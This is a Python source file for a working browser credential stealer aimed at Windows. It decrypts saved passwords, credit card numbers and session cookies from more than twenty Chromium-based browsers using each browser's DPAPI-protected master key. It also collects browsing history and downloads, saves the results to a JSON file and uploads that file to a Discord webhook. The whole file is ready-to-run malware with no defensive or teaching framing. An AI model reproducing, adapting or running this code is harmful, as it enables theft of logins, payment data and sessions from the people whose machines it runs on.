import base64
import json
import os
import shutil
import sqlite3
from datetime import datetime, timedelta
import tempfile
import sys
import time
import requests

from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

# Discord Webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/your_webhook_url_here"

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

appdata = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

browsers = {
    'avast': appdata + '\\AVAST Software\\Browser\\User Data',
    'amigo': appdata + '\\Amigo\\User Data',
    'torch': appdata + '\\Torch\\User Data',
    'kometa': appdata + '\\Kometa\\User Data',
    'orbitum': appdata + '\\Orbitum\\User Data',
    'cent-browser': appdata + '\\CentBrowser\\User Data',
    '7star': appdata + '\\7Star\\7Star\\User Data',
    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': appdata + '\\Vivaldi\\User Data',
    'chromium': appdata + '\\Chromium\\User Data',
    'chrome-canary': appdata + '\\Google\\Chrome SxS\\User Data',
    'chrome': appdata + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
    'msedge': appdata + '\\Microsoft\\Edge\\User Data',
    'msedge-canary': appdata + '\\Microsoft\\Edge SxS\\User Data',
    'msedge-beta': appdata + '\\Microsoft\\Edge Beta\\User Data',
    'msedge-dev': appdata + '\\Microsoft\\Edge Dev\\User Data',
    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': appdata + '\\Iridium\\User Data',
    'coccoc': appdata + '\\CocCoc\\Browser\\User Data',
    'opera': roaming + '\\Opera Software\\Opera Stable',
    'opera-gx': roaming + '\\Opera Software\\Opera GX Stable'
}

data_queries = {
    'login_data': {
        'query': 'SELECT action_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['URL', 'Email', 'Password'],
        'decrypt': True
    },
    'credit_cards': {
        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
        'file': '\\Web Data',
        'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
        'decrypt': True
    },
    'cookies': {
        'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
        'file': '\\Network\\Cookies',
        'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
        'decrypt': True
    },
    'history': {
        'query': 'SELECT url, title, last_visit_time FROM urls',
        'file': '\\History',
        'columns': ['URL', 'Title', 'Visited Time'],
        'decrypt': False
    },
    'downloads': {
        'query': 'SELECT tab_url, target_path FROM downloads',
        'file': '\\History',
        'columns': ['Download URL', 'Local Path'],
        'decrypt': False
    }
}


def get_master_key(path: str):
    """Extract master key from browser Local State file"""
    if not os.path.exists(path):
        return None
    
    local_state_path = path + "\\Local State"
    if not os.path.exists(local_state_path):
        return None

    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            content = f.read()
        
        if 'os_crypt' not in content:
            return None

        local_state = json.loads(content)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]
        key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return key
    except Exception as e:
        print(f"{Colors.YELLOW}\t [!] Master key error: {str(e)}{Colors.RESET}")
        return None


def decrypt_password(buff: bytes, key: bytes) -> str:
    """Decrypt password with error handling"""
    try:
        if len(buff) < 15:
            return "[ERROR: Invalid buffer]"
        
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        
        try:
            decrypted_pass = decrypted_pass[:-16].decode('utf-8')
        except (UnicodeDecodeError, IndexError):
            decrypted_pass = decrypted_pass[:-16].decode('utf-8', errors='ignore')
        
        return decrypted_pass if decrypted_pass else "[EMPTY]"
    except Exception as e:
        return f"[ERROR: {str(e)[:15]}]"


def save_to_json(all_data, output_file='browser_data.json'):
    """Save extracted data to JSON file"""
    try:
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(all_data, f, indent=2, ensure_ascii=False)
        print(f"{Colors.GREEN}[✓] Data saved to {Colors.BOLD}{output_file}{Colors.RESET}")
        return output_file
    except Exception as e:
        print(f"{Colors.RED}[!] Failed to save JSON: {str(e)}{Colors.RESET}")
        return None


def send_json_to_webhook(json_file):
    """Send JSON file to Discord webhook"""
    if not os.path.exists(json_file):
        print(f"{Colors.RED}[!] JSON file not found{Colors.RESET}")
        return False
    
    try:
        with open(json_file, 'rb') as f:
            files = {'file': (json_file, f)}
            data = {'content': 'Browser Data Extraction'}
            
            print(f"{Colors.YELLOW}[*] Sending to webhook...{Colors.RESET}")
            response = requests.post(WEBHOOK_URL, files=files, data=data, timeout=30)
            
            if response.status_code in [200, 204]:
                print(f"{Colors.GREEN}[✓] JSON sent to webhook{Colors.RESET}")
                return True
            else:
                print(f"{Colors.RED}[!] Webhook error: {response.status_code}{Colors.RESET}")
                return False
    except Exception as e:
        print(f"{Colors.RED}[!] Failed to send: {str(e)}{Colors.RESET}")
        return False


def parse_records(content):
    """Parse content string into individual records"""
    if not content or content.strip() == "":
        return []
    
    records = []
    current_record = {}
    
    for line in content.strip().split('\n'):
        if line.strip() == "":
            if current_record:
                records.append(current_record)
                current_record = {}
        else:
            if ':' in line:
                key, value = line.split(':', 1)
                current_record[key.strip()] = value.strip()
    
    if current_record:
        records.append(current_record)
    
    return records


def get_data(path: str, profile: str, key, type_of_data, data_type_name):
    """Extract from database"""
    db_file = f'{path}\\{profile}{type_of_data["file"]}'
    
    if not os.path.exists(db_file):
        return "", 0
    
    result = ""
    count = 0
    temp_dir = tempfile.gettempdir()
    temp_db = os.path.join(temp_dir, f'temp_db_{os.getpid()}_{int(time.time())}')
    
    try:
        for attempt in range(3):
            try:
                shutil.copy(db_file, temp_db)
                break
            except PermissionError:
                if attempt < 2:
                    time.sleep(0.5)
                else:
                    return "", 0
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        try:
            cursor.execute(type_of_data['query'])
            rows = cursor.fetchall()
            
            if not rows:
                conn.close()
                return "", 0
        except sqlite3.OperationalError:
            conn.close()
            return "", 0
        
        for row in rows:
            count += 1
            row = list(row)
            
            if type_of_data['decrypt']:
                if key:
                    for i in range(len(row)):
                        if isinstance(row[i], bytes) and row[i]:
                            row[i] = decrypt_password(row[i], key)
                else:
                    for i in range(len(row)):
                        if isinstance(row[i], bytes) and row[i]:
                            row[i] = "[ENCRYPTED]"
            
            if data_type_name == 'history' and len(row) > 2:
                if row[2] != 0:
                    row[2] = convert_chrome_time(row[2])
                else:
                    row[2] = "Never"
            
            result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
        
        conn.close()
        
    except Exception as e:
        print(f"{Colors.RED}\t [!] Error: {str(e)}{Colors.RESET}")
    
    finally:
        if os.path.exists(temp_db):
            try:
                os.remove(temp_db)
            except:
                pass
    
    return result, count


def convert_chrome_time(chrome_time):
    """Convert Chrome timestamp"""
    try:
        return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%Y-%m-%d %H:%M:%S')
    except:
        return "Invalid"


def installed_browsers():
    """Detect browsers"""
    available = []
    for browser_name, browser_path in browsers.items():
        try:
            if os.path.exists(browser_path + "\\Local State"):
                available.append(browser_name)
        except Exception:
            pass
    return available


if __name__ == '__main__':
    print(f"{Colors.BOLD}{Colors.RED}{'=' * 60}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.RED}  Browser Data Extraction{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.RED}{'=' * 60}{Colors.RESET}\n")
    
    available_browsers = installed_browsers()
    
    if not available_browsers:
        print(f"{Colors.YELLOW}[!] No browsers found{Colors.RESET}")
        sys.exit(1)
    
    print(f"{Colors.GREEN}[+] Found {len(available_browsers)} browser(s)\n{Colors.RESET}")
    
    all_data = {
        "timestamp": datetime.now().isoformat(),
        "browsers": {}
    }
    total_records = 0
    
    for browser in available_browsers:
        print(f"{Colors.BLUE}[*] {browser.upper()}{Colors.RESET}")
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)
        
        browser_data = {}
        
        if not master_key:
            print(f"{Colors.YELLOW}\t [!] No master key{Colors.RESET}\n")

        for data_type_name, data_type in data_queries.items():
            print(f"{Colors.BLUE}\t [*] {data_type_name.replace('_', ' ').title()}...{Colors.RESET}")
            
            profiles = ["Default"] if browser not in ['opera-gx'] else [""]
            
            for profile in profiles:
                data, count = get_data(browser_path, profile, master_key, data_type, data_type_name)
                
                if data:
                    records = parse_records(data)
                    browser_data[data_type_name] = records
                    print(f"{Colors.GREEN}\t [✓] {Colors.BOLD}{count}{Colors.GREEN} records{Colors.RESET}")
                    total_records += count
                else:
                    browser_data[data_type_name] = []
            
            print(f"{Colors.RESET}\t {'-' * 50}")
        
        all_data["browsers"][browser] = browser_data
    
    json_file = save_to_json(all_data)
    if json_file:
        send_json_to_webhook(json_file)
    
    print(f"\n{Colors.BOLD}{Colors.GREEN}[✓] Complete - {total_records} records{Colors.RESET}\n")
